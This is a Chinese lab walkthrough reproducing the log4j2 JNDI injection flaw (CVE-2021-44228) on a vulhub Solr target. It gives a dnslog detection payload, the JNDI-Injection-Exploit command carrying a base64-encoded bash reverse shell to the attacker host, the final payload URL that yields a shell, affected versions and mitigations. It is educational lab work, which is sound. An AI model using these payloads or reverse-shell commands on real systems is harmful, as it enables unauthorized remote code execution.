# log4j2漏洞复现【CVE-2021-44228】

*** 前言***

- vulhub靶场
- 攻击机：192.168.200.155，靶机：192.168.200.150

### 漏洞简介

log4j2是apache log4j2为开源日志库，用于记录java日志。该远程代码执行漏洞基于攻击者使用${}关键标识触发JNDI注入漏洞，可以执行任意代码。

### 漏洞探测

- 在``` http://dnslog.cn/```网站中拿到一个临时的DNS，点击```Get SubDomain```即可。

![image-20240428141918938](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428141918938.png)
- 靶机进入文件夹中开启docker环境，访问靶机ip:8983看到Solr界面即启动成功。

  ``` 
  命令：sudo docker-compose up -d
  ```

![image-20240428142557006](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240428142557006.png)

![image-20240428142759122](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428142759122.png)

- 在浏览器中输入下方内容，显示该页面表示成功。

  ```
  http://192.168.200.150:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.ur0yrb.dnslog.cn}
  ```

![image-20240428143445982](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428143445982.png)

- 回到dnslog.cn网址，点击```Refresh Record```刷新数据，成功回显java版本号代表存在Log4J2漏洞。

![image-20240428143713946](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428143713946.png)
### 漏洞利用

- 在攻击机中输入下方命令下载注入工具 ，并解压文件并进入tools文件夹下。

  ```
  git clone https://github.com/bkfish/Apache-Log4j-Learning.git
  ```


![image-20240428144346506](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428144346506.png)

- 攻击机再开一个终端用来监听端口，等待反弹的shell。这里我使用的是6666端口。

![image-20240428144837456](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428144837456.png)

- 攻击机把反弹shell的命令进行base64编码后写入到下方命令并运行。

  ```
  java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xNTUvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.200.155"
  ```
![image-20240428145009591](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428145009591.png)

![image-20240428145438605](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428145438605.png)

- 在红框中随便选一个payload使用即可。
![image-20240428145707376](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428145707376.png)

```
构造payload:http://192.168.200.150:8983/solr/admin/cores?action=${jndi:ldap://192.168.200.155:1389/lsaybx}
```

- 在浏览器中输入完成后，可以看到已经拿到shell。

  ![image-20240428150122077](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240428150122077.png)

### 影响范围

log4j版本：2.x <= 2.14.1

JDK 版本：小于 8u191、7u201、6u211



### 漏洞修复

1. 禁止用户请求参数出现攻击关键字
2. 禁止lookup下载远程文件
3. 禁止log4j的应用连接外网
4. 禁止log4j使用lookup
5. 从log4j jar包中中删除lookup 2.10以下
